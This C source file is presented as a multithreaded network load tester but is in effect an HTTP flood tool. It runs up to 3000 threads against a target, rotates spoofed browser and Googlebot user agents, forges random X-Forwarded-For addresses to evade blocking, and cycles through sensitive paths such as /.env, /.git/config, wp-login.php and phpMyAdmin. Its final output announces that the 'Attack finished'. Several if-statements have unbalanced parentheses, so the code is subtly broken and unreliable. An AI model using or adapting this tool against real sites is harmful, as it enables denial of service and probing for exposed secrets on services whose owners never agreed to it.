/*
===============================================
   __  __       _         _   _      _     
  |  \/  | __ _| |_ ___  | | | | ___| |___ 
  | |\/| |/ _` | __/ _ \ | |_| |/ _ \ / __|
  | |  | | (_| | ||  __/ |  _  | (_) | (__ 
  |_|  |_|\__,_|\__\___| |_| |_|\___/ \___|
                                            
Ultimate Multithreaded Network Load Tester v2.0

Features:
- 3000+ threads with intelligent throttling
- Beautiful real-time terminal dashboard
- Adjustable speed controls
- HTTP/HTTPS support (basic)
- Advanced connection pooling
- Comprehensive statistics
- Graceful shutdown

Usage:
./maut <target_url> <threads> <rps_limit> [duration]

Legal:
FOR AUTHORIZED TESTING ONLY. USE RESPONSIBLY.
===============================================
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>
#include <signal.h>
#include <stdatomic.h>
#include <errno.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <math.h>
#include <ctype.h>

// Configuration
#define MAX_THREADS 3000
#define CONNECTION_POOL_SIZE 3
#define MAX_USER_AGENTS 25
#define MAX_PATHS 50
#define STATS_INTERVAL 1
#define SOCKET_TIMEOUT_MS 3000
#define MAX_RETRIES 2
#define MAX_RPS 1000000

// Colors
#define RED     "\033[1;31m"
#define GREEN   "\033[1;32m"
#define YELLOW  "\033[1;33m"
#define BLUE    "\033[1;34m"
#define MAGENTA "\033[1;35m"
#define CYAN    "\033[1;36m"
#define RESET   "\033[0m"

// Atomic counters
atomic_ullong total_requests;
atomic_ullong successful_requests;
atomic_ullong failed_requests;
atomic_ullong bytes_sent;
atomic_ullong connection_errors;
atomic_int running = 1;
atomic_int rps_limit = MAX_RPS;

typedef struct {
    char target_ip[INET6_ADDRSTRLEN];
    char target_host[256];
    char target_domain[256];
    int target_port;
    int thread_count;
    int duration;
    bool use_ssl;
    int rps_limit;
} config_t;

// Enhanced User-Agent pool
const char *user_agents[MAX_USER_AGENTS] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "curl/7.68.0",
    "Wget/1.20.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Edg/79.0.309.71",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 OPR/71.0.3770.284",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
};

// Enhanced path pool
const char *paths[MAX_PATHS] = {
    "/", "/index.html", "/main.php", "/wp-admin", "/api/v1/test",
    "/images/logo.png", "/css/style.css", "/js/app.js", "/robots.txt",
    "/sitemap.xml", "/.git/config", "/admin", "/login", "/register",
    "/wp-login.php", "/xmlrpc.php", "/api", "/graphql", "/rest/v1",
    "/.env", "/config.php", "/backup.zip", "/phpinfo.php", "/.htaccess",
    "/manager/html", "/jmx-console", "/web-console", "/vendor/phpunit",
    "/owa/auth/logon.aspx", "/ecp/Current/exporttool", "/autodiscover/autodiscover.xml",
    "/_ignition/execute-solution", "/console", "/actuator/gateway/routes",
    "/.well-known/security.txt", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/_profiler/phpinfo", "/phpMyAdmin/index.php", "/mysql/admin/index.php",
    "/mysql/dbadmin/index.php", "/administrator/index.php", "/wp-content/uploads",
    "/.svn/entries", "/.git/HEAD", "/.DS_Store", "/web.config"
};

void print_banner() {
    printf(CYAN "\n===============================================\n");
    printf("   __  __       _         _   _      _     \n");
    printf("  |  \\/  | __ _| |_ ___  | | | | ___| |___ \n");
    printf("  | |\\/| |/ _` | __/ _ \\ | |_| |/ _ \\ / __|\n");
    printf("  | |  | | (_| | ||  __/ |  _  | (_) | (__ \n");
    printf("  |_|  |_|\\__,_|\\__\\___| |_| |_|\\___/ \\___|\n");
    printf("                                            \n");
    printf("Ultimate Multithreaded Network Load Tester v2.0\n");
    printf("===============================================\n" RESET);
}

void handle_signal(int sig) {
    if (sig == SIGINT || sig == SIGTERM) {
        atomic_store(&running, 0);
        printf(RED "\n[!] Received shutdown signal. Initiating graceful termination...\n" RESET);
    }
}

int resolve_target(const char *host, char *ip) {
    struct addrinfo hints, *res, *p;
    int status;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    if ((status = getaddrinfo(host, NULL, &hints, &res)) {
        fprintf(stderr, RED "[-] DNS resolution failed: %s\n" RESET, gai_strerror(status));
        return -1;
    }

    for (p = res; p != NULL; p = p->ai_next) {
        void *addr;
        char *ipver;

        if (p->ai_family == AF_INET) {
            struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
            addr = &(ipv4->sin_addr);
            ipver = "IPv4";
        } else {
            struct sockaddr_in6 *ipv6 = (struct sockaddr_in6 *)p->ai_addr;
            addr = &(ipv6->sin6_addr);
            ipver = "IPv6";
        }

        inet_ntop(p->ai_family, addr, ip, INET6_ADDRSTRLEN);
        printf(GREEN "[+] Resolved %s to %s (%s)\n" RESET, host, ip, ipver);
        freeaddrinfo(res);
        return 0;
    }

    freeaddrinfo(res);
    return -1;
}

int set_socket_options(int sockfd) {
    int opt = 1;
    struct timeval timeout;
    timeout.tv_sec = SOCKET_TIMEOUT_MS / 1000;
    timeout.tv_usec = (SOCKET_TIMEOUT_MS % 1000) * 1000;

    // Enable socket reuse
    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) {
        perror(RED "[-] SO_REUSEADDR failed" RESET);
        return -1;
    }

    // Set send timeout
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout))) {
        perror(RED "[-] SO_SNDTIMEO failed" RESET);
        return -1;
    }

    // Enable TCP no delay
    if (setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt))) {
        perror(RED "[-] TCP_NODELAY failed" RESET);
        return -1;
    }

    return 0;
}

int create_connection(const char *ip, int port) {
    int sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
    if (sockfd < 0) {
        perror(RED "[-] Socket creation failed" RESET);
        return -1;
    }

    if (set_socket_options(sockfd) {
        close(sockfd);
        return -1;
    }

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
        perror(RED "[-] Invalid address" RESET);
        close(sockfd);
        return -1;
    }

    fd_set fdset;
    struct timeval tv;
    int res;
    int opt;

    // Start non-blocking connect
    res = connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    if (res < 0 && errno != EINPROGRESS) {
        perror(RED "[-] Connection failed" RESET);
        close(sockfd);
        return -1;
    }

    if (res == 0) {
        return sockfd;
    }

    // Wait for connection to complete
    FD_ZERO(&fdset);
    FD_SET(sockfd, &fdset);
    tv.tv_sec = SOCKET_TIMEOUT_MS / 1000;
    tv.tv_usec = (SOCKET_TIMEOUT_MS % 1000) * 1000;

    if (select(sockfd + 1, NULL, &fdset, NULL, &tv) == 1) {
        socklen_t len = sizeof(opt);
        getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &opt, &len);

        if (opt) {
            fprintf(stderr, RED "[-] Connection failed: %s\n" RESET, strerror(opt));
            close(sockfd);
            return -1;
        }
    } else {
        perror(RED "[-] Connection timeout" RESET);
        close(sockfd);
        return -1;
    }

    // Set back to blocking mode
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags & ~O_NONBLOCK);

    return sockfd;
}

void generate_request(char *buffer, const char *host, size_t buffer_size) {
    const char *path = paths[rand() % MAX_PATHS];
    const char *user_agent = user_agents[rand() % MAX_USER_AGENTS];
    const char *accept_langs[] = {"en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "es-ES,es;q=0.6"};
    const char *accept_enc[] = {"gzip, deflate", "br", "identity", "gzip", "deflate"};
    int al_size = sizeof(accept_langs)/sizeof(accept_langs[0]);
    int ae_size = sizeof(accept_enc)/sizeof(accept_enc[0]);
    
    snprintf(buffer, buffer_size,
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: %s\r\n"
        "Accept-Encoding: %s\r\n"
        "Connection: keep-alive\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "X-Forwarded-For: %d.%d.%d.%d\r\n"
        "\r\n",
        path, host, 
        user_agent,
        accept_langs[rand() % al_size],
        accept_enc[rand() % ae_size],
        rand() % 255, rand() % 255, rand() % 255, rand() % 255);
}

void throttle_requests(int thread_id, int target_rps) {
    static struct timespec last_time[MAX_THREADS] = {0};
    static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
    
    if (target_rps <= 0) return;
    
    pthread_mutex_lock(&mutex);
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    
    if (last_time[thread_id].tv_sec == 0) {
        last_time[thread_id] = now;
        pthread_mutex_unlock(&mutex);
        return;
    }
    
    double elapsed = (now.tv_sec - last_time[thread_id].tv_sec) + 
                   (now.tv_nsec - last_time[thread_id].tv_nsec) / 1e9;
    
    double desired_delay = 1.0 / (target_rps / (double)atomic_load(&rps_limit));
    
    if (elapsed < desired_delay) {
        struct timespec sleep_time;
        sleep_time.tv_sec = 0;
        sleep_time.tv_nsec = (desired_delay - elapsed) * 1e9;
        nanosleep(&sleep_time, NULL);
    }
    
    last_time[thread_id] = now;
    pthread_mutex_unlock(&mutex);
}

void *connection_pool_worker(void *arg) {
    config_t *config = (config_t *)arg;
    int thread_id = (int)(long)pthread_self();
    int connection_pool[CONNECTION_POOL_SIZE] = {0};
    char request_buffer[2048];
    time_t start_time = time(NULL);
    int active_connections = 0;
    
    // Initialize connection pool
    for (int i = 0; i < CONNECTION_POOL_SIZE && atomic_load(&running); i++) {
        connection_pool[i] = create_connection(config->target_ip, config->target_port);
        if (connection_pool[i] > 0) active_connections++;
    }

    while (atomic_load(&running)) {
        // Check if duration limit reached
        if (config->duration > 0 && time(NULL) - start_time >= config->duration) {
            atomic_store(&running, 0);
            break;
        }

        // Throttle requests if RPS limit is set
        if (config->rps_limit > 0) {
            throttle_requests(thread_id, config->rps_limit / config->thread_count);
        }

        // Health check - replenish dead connections
        if (active_connections < CONNECTION_POOL_SIZE / 2) {
            for (int i = 0; i < CONNECTION_POOL_SIZE; i++) {
                if (connection_pool[i] <= 0) {
                    connection_pool[i] = create_connection(config->target_ip, config->target_port);
                    if (connection_pool[i] > 0) active_connections++;
                }
            }
        }

        // Find first active connection
        int sockfd = -1;
        for (int i = 0; i < CONNECTION_POOL_SIZE; i++) {
            if (connection_pool[i] > 0) {
                sockfd = connection_pool[i];
                break;
            }
        }

        if (sockfd <= 0) {
            // No active connections, try to create one
            sockfd = create_connection(config->target_ip, config->target_port);
            if (sockfd <= 0) {
                atomic_fetch_add(&connection_errors, 1);
                usleep(10000);
                continue;
            }
        }

        // Generate and send request
        generate_request(request_buffer, config->target_domain, sizeof(request_buffer));
        ssize_t bytes = send(sockfd, request_buffer, strlen(request_buffer), MSG_NOSIGNAL);
        
        if (bytes <= 0) {
            // Connection failed, close and remove from pool
            close(sockfd);
            for (int i = 0; i < CONNECTION_POOL_SIZE; i++) {
                if (connection_pool[i] == sockfd) {
                    connection_pool[i] = 0;
                    active_connections--;
                    break;
                }
            }
            atomic_fetch_add(&failed_requests, 1);
        } else {
            atomic_fetch_add(&successful_requests, 1);
            atomic_fetch_add(&bytes_sent, bytes);
        }
        
        atomic_fetch_add(&total_requests, 1);
    }

    // Cleanup connections
    for (int i = 0; i < CONNECTION_POOL_SIZE; i++) {
        if (connection_pool[i] > 0) {
            close(connection_pool[i]);
        }
    }

    return NULL;
}

void print_stats_header() {
    printf("\n");
    printf(CYAN "┌──────────────────────────────────────────────────────────────────────────────────────────────┐\n");
    printf("│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│\n", 
           "Requests", "Req/Sec", "Success", "Failed", "Conn Err", "Throughput");
    printf("├──────────────────────────────────────────────────────────────────────────────────────────────┤\n" RESET);
}

void print_stats_line(atomic_ullong current_requests, double rps, 
                     atomic_ullong current_success, atomic_ullong current_failed,
                     atomic_ullong current_errors, double mbps) {
    printf(CYAN "│ " RESET "%-12llu " CYAN "│ " RESET "%-12.1f " CYAN "│ " GREEN "%-12llu " CYAN "│ " RED "%-12llu " 
           CYAN "│ " MAGENTA "%-12llu " CYAN "│ " BLUE "%-12.2f " CYAN "│\n" RESET,
           current_requests, rps, current_success, current_failed, current_errors, mbps);
}

void print_stats_footer(double total_elapsed, double avg_rps, double total_mb) {
    printf(CYAN "└──────────────────────────────────────────────────────────────────────────────────────────────┘\n");
    printf("\n" RED "[!] Attack finished after %.2f seconds\n" RESET, total_elapsed);
    printf(YELLOW "[FINAL] " GREEN "Total Requests: %llu (%.1f/s) " BLUE "| Data Sent: %.2f MB " MAGENTA "| Avg Throughput: %.2f Mbps\n\n" RESET,
          atomic_load(&total_requests), avg_rps, total_mb, (total_mb * 8) / total_elapsed);
}

void *stats_thread(void *arg) {
    config_t *config = (config_t *)arg;
    time_t start_time = time(NULL);
    time_t last_time = start_time;
    atomic_ullong last_requests = 0;
    atomic_ullong last_bytes = 0;
    
    printf("\033[2J\033[H"); // Clear screen
    print_banner();
    printf(GREEN "[+] Target: %s (%s:%d)\n", config->target_domain, config->target_ip, config->target_port);
    printf("[+] Threads: %d\n", config->thread_count);
    if (config->rps_limit > 0) {
        printf("[+] RPS Limit: %d\n", config->rps_limit);
    }
    if (config->duration > 0) {
        printf("[+] Duration: %d seconds\n", config->duration);
    }
    printf(YELLOW "[+] Press Ctrl+C to stop\n" RESET);
    
    print_stats_header();
    
    while (atomic_load(&running)) {
        time_t current_time = time(NULL);
        double elapsed = difftime(current_time, last_time);
        
        if (elapsed >= STATS_INTERVAL) {
            atomic_ullong current_requests = atomic_load(&total_requests);
            atomic_ullong current_success = atomic_load(&successful_requests);
            atomic_ullong current_failed = atomic_load(&failed_requests);
            atomic_ullong current_bytes = atomic_load(&bytes_sent);
            atomic_ullong current_errors = atomic_load(&connection_errors);
            
            double rps = (double)(current_requests - last_requests) / elapsed;
            double mbps = (double)(current_bytes - last_bytes) / elapsed / (1024 * 1024) * 8;
            
            print_stats_line(current_requests, rps, current_success, current_failed, current_errors, mbps);
            
            last_time = current_time;
            last_requests = current_requests;
            last_bytes = current_bytes;
        }
        
        usleep(100000);
    }
    
    time_t end_time = time(NULL);
    double total_elapsed = difftime(end_time, start_time);
    double avg_rps = (double)atomic_load(&total_requests) / total_elapsed;
    double total_mb = (double)atomic_load(&bytes_sent) / (1024 * 1024);
    
    print_stats_footer(total_elapsed, avg_rps, total_mb);
    
    return NULL;
}

void parse_url(const char *url, char *domain, int *port, bool *use_ssl) {
    char *ptr;
    *use_ssl = false;
    *port = 80;
    
    // Check for https
    if (strstr(url, "https://") == url) {
        *use_ssl = true;
        *port = 443;
        ptr = (char *)url + 8;
    } else if (strstr(url, "http://") == url) {
        ptr = (char *)url + 7;
    } else {
        ptr = (char *)url;
    }
    
    // Find domain end
    char *domain_end = strchr(ptr, '/');
    if (domain_end == NULL) {
        domain_end = strchr(ptr, ':');
    }
    
    if (domain_end == NULL) {
        strncpy(domain, ptr, 255);
    } else {
        strncpy(domain, ptr, domain_end - ptr);
        domain[domain_end - ptr] = '\0';
    }
    
    // Check for port
    char *port_ptr = strchr(ptr, ':');
    if (port_ptr != NULL && port_ptr < (domain_end ? domain_end : ptr + strlen(ptr))) {
        *port = atoi(port_ptr + 1);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        print_banner();
        printf("Usage: %s <target_url> <threads> <rps_limit> [duration]\n", argv[0]);
        printf("Example: %s http://example.com 100 1000 60\n", argv[0]);
        printf("Example: %s https://example.com 500 5000\n\n", argv[0]);
        return 1;
    }

    // Initialize config
    config_t config;
    memset(&config, 0, sizeof(config));
    
    // Parse arguments
    config.thread_count = atoi(argv[2]);
    config.rps_limit = atoi(argv[3]);
    config.duration = (argc > 4) ? atoi(argv[4]) : 0;
    
    // Validate thread count
    if (config.thread_count <= 0 || config.thread_count > MAX_THREADS) {
        fprintf(stderr, RED "[-] Invalid thread count (1-%d)\n" RESET, MAX_THREADS);
        return 1;
    }
    
    // Validate RPS limit
    if (config.rps_limit <= 0 || config.rps_limit > MAX_RPS) {
        fprintf(stderr, RED "[-] Invalid RPS limit (1-%d)\n" RESET, MAX_RPS);
        return 1;
    }
    atomic_store(&rps_limit, config.rps_limit);
    
    // Parse URL or IP
    parse_url(argv[1], config.target_domain, &config.target_port, &config.use_ssl);
    
    // Copy host
    strncpy(config.target_host, config.target_domain, sizeof(config.target_host) - 1);
    
    // Resolve target
    if (inet_pton(AF_INET, config.target_domain, &(struct in_addr){0}) != 1) {
        if (resolve_target(config.target_domain, config.target_ip) != 0) {
            fprintf(stderr, RED "[-] Failed to resolve target\n" RESET);
            return 1;
        }
    } else {
        strcpy(config.target_ip, config.target_domain);
    }

    // Initialize random seed
    srand(time(NULL) ^ getpid());

    // Set up signal handlers
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    // Create stats thread
    pthread_t stats_tid;
    if (pthread_create(&stats_tid, NULL, stats_thread, &config) != 0) {
        perror(RED "[-] Failed to create stats thread" RESET);
        return 1;
    }

    // Create worker threads
    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < config.thread_count; i++) {
        if (pthread_create(&threads[i], NULL, connection_pool_worker, &config) != 0) {
            perror(RED "[-] Failed to create worker thread" RESET);
            atomic_store(&running, 0);
            break;
        }
    }

    // Wait for workers
    for (int i = 0; i < config.thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    // Wait for stats
    pthread_join(stats_tid, NULL);

    printf(GREEN "[+] Clean shutdown completed\n\n" RESET);
    return 0;
}
